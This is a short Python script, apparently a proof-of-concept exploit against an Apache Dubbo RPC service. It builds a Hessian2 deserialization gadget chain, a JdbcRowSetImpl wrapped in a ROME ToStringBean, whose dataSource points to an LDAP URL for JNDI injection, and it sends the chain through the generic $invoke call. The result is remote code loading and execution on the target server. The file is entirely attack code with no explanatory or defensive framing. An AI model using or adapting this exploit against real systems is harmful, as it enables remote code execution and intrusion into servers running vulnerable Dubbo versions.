# -*- coding: utf-8 -*-
# Ruilin
# pip3 install dubbo-py
from dubbo.codec.hessian2 import Decoder,new_object
from dubbo.client import DubboClient
 
client = DubboClient('127.0.0.1', 20880)
 
JdbcRowSetImpl=new_object(
    'com.sun.rowset.JdbcRowSetImpl',
    dataSource="ldap://127.0.0.1:1389/olyuyt",
    strMatchColumns=["foo"]
    )
JdbcRowSetImplClass=new_object(
    'java.lang.Class',
    name="com.sun.rowset.JdbcRowSetImpl",
    )
toStringBean=new_object(
    'com.rometools.rome.feed.impl.ToStringBean',
    beanClass=JdbcRowSetImplClass,
    obj=JdbcRowSetImpl
    )
 
resp = client.send_request_and_return_response(
    service_name='cn.rui0',
    method_name='$invoke',
    args=[toStringBean])
print(resp)
